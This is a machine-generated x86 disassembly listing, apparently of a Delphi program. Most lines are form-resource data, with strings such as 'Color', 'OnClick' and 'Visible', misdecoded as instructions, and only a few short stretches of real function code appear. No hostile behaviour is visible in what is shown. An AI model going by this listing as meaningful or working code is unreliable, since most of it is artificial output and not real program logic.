hlt
push 0xe8ff0000
mov eax [ eax + eax - 0x8 ]
jb r-xdata
hlt
jb r-xdata
jb r-xdata
add [ eax + 0x42080016 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6065646f
sbb eax r--data
add bh bh
xchg esp eax
mov [ eax + eax - 0x50 ] es
mov [ eax + eax ] es
add [ eax ] al
add [ 0x17ff0000 ] 0x0
add eax 0x6f6c6f43
insb
dec ecx
outsb
outsb
jb r-xdata
push ds
add [ esi ] cl
push eax
popad
jb r-xdata
adc [ eax ] al
cld
add [ eax ] al
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a001d ] al
je r-xdata
mov eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001c ] al
outsd
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ edx ] ah
inc edx
add [ eax ] ch
add bh bh
call 0xfffffffff8432f86
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x1cff0001 ] ah
add [ eax ] al
push esp
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
inc [ eax + eax + 0x1 ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ 0x65420a00 ] dl
adc al 0x0
or [ edx + 0x65 ] eax
jbe r-xdata
dec ebx
inc esp
add [ ebp + 0x1 ] ah
add bh bh
add [ fs : ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
or dl [ eax + 0x61 ]
jb r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
or edx [ eax + 0x61 ]
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x40100074
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add dh bh
sbb [ esp + eax * 2 ] cl
add [ eax ] 0x0
add [ eax - 0x80000000 ] al
and al 0x0
or [ ebx + 0x68 ] dl
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] ah
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] r--data
adc [ eax ] al
pop edx
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
js r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
adc al 0x8a
jo r-xdata
push cs
push eax
popad
jb r-xdata
je r-xdata
sub al 0x0
or cl [ edi + 0x6e ]
push ebp
jo r-xdata
outsd
ja r-xdata
inc esp
add al bh
hlt
adc [ eax ] al
0x68ff0000 0x448c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax ]
cmc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
and [ esp + eax * 2 + 0x100 ] cl
add [ eax - 0x80000000 ] al
xor [ eax ] al
or [ edi + 0x6e ] ecx
inc esp
jb r-xdata
add [ eax ] al
sub [ edx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
push esi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x14656c62
push esi
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080028 ] al
outsb
adc [ eax ] al
push edi
add [ eax ] al
call [ edx + ecx * 4 ]
adc [ eax ] al
cdq
add [ eax ] al
inc [ esp + ecx * 4 + 0x44 ]
add [ esp + ecx * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080024 ] al
push 0x6948776f
outsb
je r-xdata
hlt
push 0x6948776f
outsb
je r-xdata
dec ebx
jns r-xdata
adc al 0x56
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070032 ] al
outsb
inc ebp
outsb
je r-xdata
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jo r-xdata
add [ eax ] al
js r-xdata
inc ebx
push 0x65676e61
adc al 0x56
inc ecx
add [ eax ] dh
add al [ eax ]
push [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] al
or [ edi + 0x6e ] cl
cmp eax [ eax + eax + 0x78 ]
je r-xdata
outsb
jpo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
[ eax ]
add [ eax + 0x4f0a002e ] al
outsb
inc esp
jb r-xdata
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] 0x0
add [ eax + 0x4f090031 ] al
dec edi
jbe r-xdata
adc al 0x56
push eax
outsd
jo r-xdata
add [ eax + eax ] bh
[ edx + ecx * 4 + 0x10044 ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0039 ] al
outsb
jo r-xdata
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or ecx [ edi + 0x6e ]
cmp [ esi ] 0x44
add al ah
add [ eax ] eax
jmp eax
push ebx
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0038 ] al
outsb
jb r-xdata
add [ eax ] al
xor [ ebx ] 0x0
outsb
inc ebp
js r-xdata
push esi
outsb
dec edi
jb r-xdata
add al [ eax ]
[ eax ]
jo r-xdata
pop esi
or al 0xc7
inc esi
or [ eax ] dh
int1
jb r-xdata
add [ eax ] al
xor [ edi ] 0x0
or [ edi + 0x6e ] cl
push ebx
insb
arpl [ gs : esp + ebp * 4 + 0x41 ] si
inc esp
add [ eax ] al
add [ eax ] eax
push esi
inc ecx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
call sub_4482b0
mov edx 0x41
mov eax ebx
call sub_4482d4
mov dl 0x1
mov eax [ r-xdata ]
jb r-xdata
je r-xdata
jae r-xdata
jns r-xdata
je r-xdata
add [ eax ] al
sub [ edi ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
inc ecx
add [ eax ] ch
push esi
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941ed63
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002d ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
sub [ eax + eax ] 0xa
dec edi
outsb
push esi
inc ecx
add [ eax ] ch
add [ eax ] eax
mov esi eax
mov [ ebx + 0x16c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_42f130
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
inc esp
jb r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
call sub_423b40
mov esi eax
mov [ ebx + 0x168 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_42f130
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e0c
and eax [ edx ]
inc esp
outsd
arpl [ ebx - 0x5c ] bp
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
push ebx
je r-xdata
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or ecx [ edi + 0x6e ]
xor al 0x3e
inc esp
add al ch
add [ eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
dec ebx
jns r-xdata
inc esp
add al bl
add [ eax ] eax
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060033 ] al
adc al 0x56
jo r-xdata
inc edx
add [ edx + 0x2404a101 ] dh
inc edx
add al ch
outsb
dec esi
xor cl dh
mov eax eax
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
inc ebp
outsb
inc esp
jb r-xdata
outsd
ja r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_450524
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0x41
mov eax ebx
add esp 0xfffffff0
call sub_4035dc
push es
dec edi
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
in al dx
aas
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090030 ] al
outsb
sub_42ded6
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax - 0x6fffbb0f ] dh
rol [ ebx ] cl
fdivr [ ecx - 0x3883ffbc ]
inc esp
add ah ch
rol [ ebx ] cl
les eax [ fs : eax + eax - 0x6c ]
retn 0x44
sub_42df04
adc al 0xc8
inc esp
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add [ eax + edx ] cl
inc ebp
add ah ah
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add ah bh
rol [ ebx ] cl
pushfd
cld
inc edx
add [ ebx ] cl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
inc eax
fild [ edx ]
pop es
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
pushad
fiadd [ edx ]
call 0x2f432233
add [ eax ] cl
inc ebp
js r-xdata
and al 0x8b
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
xor ah 0xff
imul ebp [ edi + 0x6e ] sub_421d60
jo r-xdata
stosb [ edi ]
mov eax [ eax + eax - 0x10 ]
insb
jae r-xdata
add bh bh
xchg esp eax
mov [ eax + eax - 0x50 ] es
mov [ eax + eax ] es
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ ecx ] ah
add bh bh
dec eax
jle r-xdata
add al al
xor al 0x44
add [ ebx ] bl
add bh bh
or [ eax + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
hlt
inc ebx
adc [ eax ] al
sbb al 0x2
add bh bh
cwde
cli
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc esp
add al dh
add ah ah
jle r-xdata
add [ gs : eax ] dl
xor eax [ eax + ebp * 4 + 0x34 ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
je r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ esp + esi * 8 ]
inc esp
add [ eax - 0xc ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
int3
jae r-xdata
add bh bh
call 0xfffffffff8432570
mov eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ 0x6d657449 ] al
jae r-xdata
adc [ eax ] al
sbb [ edx ] al
add bh bh
sar dl 0x1
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
cmp eax [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ edx ] ah
inc edx
add [ eax ] ch
cmp al 0x44
add [ eax + eax ] dh
dec eax
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0019 ] al
outsd
outsb
jae r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ esi ] cl
outsb
je r-xdata
mov [ eax + eax + 0x1 ] es
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
outsb
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
hlt
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ ebx + 0x68 ] dl
outsb
adc [ eax ] al
test eax 0x4cff0001
hlt
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
outsb
je r-xdata
sbb al 0x0
add [ eax ] al
add [ eax + 0x1 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] r--data
adc [ eax ] al
fadd [ eax * 2 + 0xbc00 ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
je r-xdata
outsb
jpo r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
js r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
adc al 0x8a
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
outsb
je r-xdata
cmp eax [ eax + eax + 0x78 ]
add [ eax + eax ] bh
[ edx + ecx * 4 + 0x10044 ]
outsd
ja r-xdata
inc esp
add al bh
hlt
adc [ eax ] al
0x68ff0000 0x448c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax ]
cmc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
and [ esp + eax * 2 + 0x100 ] cl
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500b00
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x14656c62
push esi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
push edi
add [ eax ] al
call [ edx + ecx * 4 ]
adc [ eax ] al
cdq
add [ eax ] al
inc [ esp + ecx * 4 + 0x44 ]
add [ esp + ecx * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080021 ] al
push 0x6948776f
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ eax - 0x80000000 ] al
and eax 0x6e4f0700
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
mov eax 0x100448c
add [ eax ] al
js r-xdata
push ebx
je r-xdata
adc al 0x56
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push eax
outsd
jo r-xdata
jae r-xdata
jb r-xdata
push ebx
je r-xdata
jb r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
push cs
arpl [ edx + 0x53 ] sp
arpl [ edx + 0x45 ] sp
jns r-xdata
push ebx
inc esp
outsd
arpl [ ebx - 0x5c ] bp
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
arpl [ ebp + esi * 2 + 0x64 ] bp
dec esi
jb r-xdata
add [ eax ] al
sub [ eax + eax ] 0x6
dec edi
outsb
inc ebp
js r-xdata
push esi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
dec edi
jbe r-xdata
aas
inc esp
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi fs
inc edx
add [ esi - 0x57ffbd1a ] ah
add al [ eax ]
add al al
je r-xdata
insb
in al 0x42
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
mov al 0x43
add [ esi + ecx + 0x34cc0042 ] al
inc eax
je r-xdata
jne r-xdata
popa
inc esp
jb r-xdata
add [ esi ] al
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
insb
in eax 0x42
insd
inc ebx
outsd
or eax 0x72506263
je r-xdata
arpl [ edx + 0x43 ] sp
jne r-xdata
outsd
outsb
adc [ gs : ebx + 0x62 ] ah
dec ecx
outsb
dec esi
lea eax [ bx + si ]
jo r-xdata
dec esi
outsb
popad
jb r-xdata
add [ eax + 0x4f09002a ] al
outsb
add [ eax ] al
inc ecx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
aas
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] bl
enter 0x44 0x40
loop r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x14 ]
cli
inc ebx
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ edi + ebp * 8 - 0x3b9bffbd ] ch
inc esp
add ah bl
inc [ edx ]
adc al 0xc8
inc esp
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x1959ffbe ] cl
or eax 0x6e496263
or al 0xef
jns r-xdata
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002e ] al
outsb
inc edx
add [ ebx ] al
andps xmm0 [ ebx + 0x6f ]
insb
outsd
jb r-xdata
nop
inc ebp
js r-xdata
je r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax + 0x4f07002b ] al
add [ eax ] al
inc ebx
add [ eax - 0x1b ] al
inc ebx
add [ eax - 0x6 ] ch
inc ebx
add [ eax + 0x580043ef ] cl
jecxz r-xdata
add [ eax - 0xf ] dl
inc ebx
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ esi + ebp * 8 ] bl
inc ebx
add al dh
loop r-xdata
add al bl
test al 0x2
add [ eax ] al
shl [ eax + 0xe840043 ] 0x42
add ah cl
xor al 0x40
popad
pop es
inc edx
insd
inc ebx
outsd
insb
outsd
jb r-xdata
insb
outsd
jb r-xdata
outsd
js r-xdata
outsd
inc esp
inc ebx
inc edx
add [ eax - 0x3ffffffe ] ch
je r-xdata
js r-xdata
js r-xdata
adc [ ebx + 0x62 ] ah
inc ebp
jb r-xdata
add [ edx + edi * 8 + 0x43 ] bl
add [ eax ] ch
out dx al
inc ebx
add [ ebp * 8 + 0x2c0043 ] dh
inc ebx
add [ eax - 0x8 ] bh
inc ebx
add [ eax - 0x11 ] cl
inc ebx
add [ eax + 0x4004302 ] dl
add [ eax - 0x45004301 ] dh
push [ edx + 0x42fca8ff ]
add [ edx + eax ] al
inc ebx
add [ edx + eax ] bl
add [ ebx ] bl
inc ebx
add [ eax ] dh
out dx al
or [ ebp + 0x78 ] al
arpl [ edx + 0x50 ] sp
jb r-xdata
arpl [ ebp + esi * 2 + 0x64 ] bp
inc esp
popa
bound ecx [ ecx + 0x6e ]
je r-xdata
inc ebx
add ah dh
std
inc esp
add [ esi + eax * 8 ] bl
add [ edi + ebp * 8 ] cl
je r-xdata
add [ ecx + ecx * 4 ] cl
inc ecx
add [ edx + eax + 0x43 ] dh
add ah al
jg r-xdata
insb
jae r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] dl
inc edx
add [ eax + 0x20000002 ] ch
outsd
js r-xdata
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
or al 0xef
inc ebx
add ah dh
std
inc esp
inc eax
je r-xdata
inc ebx
add [ eax + 0xf004305 ] dh
push esp
inc ebx
jne r-xdata
sbb al 0x2
add [ eax - 0x14 ] bh
je r-xdata
insd
jae r-xdata
insb
jae r-xdata
add [ esi + ecx - 0x93ffbe ] ah
inc edx
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
add [ ebx + ecx + 0x42 ] bh
add [ ebp - 0x1a93ffc0 ] cl
inc edx
insb
add [ gs : esp + 0x42 ] ebp
or ch ah
inc edx
add [ esi ] al
push cs
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
inc ebx
add [ edx ] dl
inc ebx
add [ eax - 0x13 ] bl
inc ebx
add [ ebp + ebp * 8 + 0x43 ] ah
add al dh
in eax dx
inc ebx
add [ eax + 0x64004542 ] al
loop r-xdata
sar [ esi + 0xf070042 ] 0x54
inc ebx
jne r-xdata
aam 0x34
insd
inc ebx
outsd
insb
outsd
add [ eax ] al
add [ eax ] al
add [ esp + 0x42 ] ch
add [ eax ] dl
arpl [ edx + 0x53 ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
push es
add [ eax ] bl
enter 0x44 0x40
loop r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x14 ]
cli
inc ebx
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ edi + ebp * 8 - 0x3b9bffbd ] ch
inc esp
add ah bl
inc [ edx ]
adc al 0xc8
inc esp
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
inc ecx
add [ edx + eax + 0x43 ] dh
add ah al
jg r-xdata
mov [ eax + eax + 0xc ] 0x89
je r-xdata
inc ebx
add [ eax - 0x1b ] al
inc ebx
add [ eax - 0x6 ] ch
inc ebx
add [ eax + 0x580043ef ] cl
jecxz r-xdata
add [ eax - 0xf ] dl
inc ebx
add al dh
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
insd
inc ebx
outsd
insb
outsd
jb r-xdata
inc ebp
js r-xdata
add [ edx + edi * 8 + 0x43 ] bl
add [ eax ] ch
out dx al
inc ebx
add [ ebp * 8 + 0x2c0043 ] dh
inc ebx
add [ eax - 0x8 ] bh
inc ebx
add [ eax - 0x11 ] cl
inc ebx
add [ eax + 0x9004302 ] dl
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ ebx ] bl
inc ebx
add [ eax ] dh
out dx al
inc ebx
add [ edx ] dl
inc ebx
add [ eax - 0x13 ] bl
inc ebx
add [ ebp + ebp * 8 + 0x43 ] ah
add al dh
in eax dx
inc ebx
